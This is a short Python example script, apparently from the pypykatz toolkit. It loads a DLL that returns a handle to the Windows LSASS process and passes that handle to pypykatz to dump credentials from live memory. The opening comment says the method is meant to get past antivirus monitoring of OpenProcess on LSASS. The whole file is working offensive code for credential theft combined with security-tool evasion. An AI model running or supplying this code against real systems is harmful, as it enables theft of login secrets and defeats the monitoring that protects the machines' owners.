
#
# In case you happen to have a DLL that has an export which returns a handle to LSASS process
# You can use this example to load such DLL via ctypes and call pypykatz using said handle
# Might be interesting to bypass AV monitoring openprocess on LSASS
#

from ctypes import windll, c_void_p
from pypykatz.pypykatz import pypykatz

dll_path = ''

def get_lsass_handle():
	your_dll = windll.LoadLibrary(dll_path)
	_your_function = your_dll.your_function
	_your_function.argtypes = [] #I guess no args
	_your_function.restype  = c_void_p #this is basically a handle
	
	phandle = _your_function()

	return phandle


phandle = get_lsass_handle()
res = pypykatz.go_live_phandle(phandle)
print(str(res))
